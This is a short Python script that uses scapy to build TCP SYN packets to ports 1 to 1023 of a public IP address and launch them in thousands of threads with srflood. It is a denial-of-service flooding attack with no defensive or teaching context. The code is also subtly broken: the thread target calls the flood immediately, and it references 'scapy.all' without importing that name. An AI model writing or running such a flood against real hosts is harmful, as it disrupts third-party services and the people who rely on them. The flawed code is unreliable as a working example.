import sys
import threading
from scapy.all import *

packet = scapy.all.IP(src="192.168.0.105", dst="142.250.183.46") /\
         scapy.all.TCP(dport=range(1,1024), flags="S")

for i in range(10000):
    t = threading.Thread(target=scapy.all.srflood(packet))
    t.start()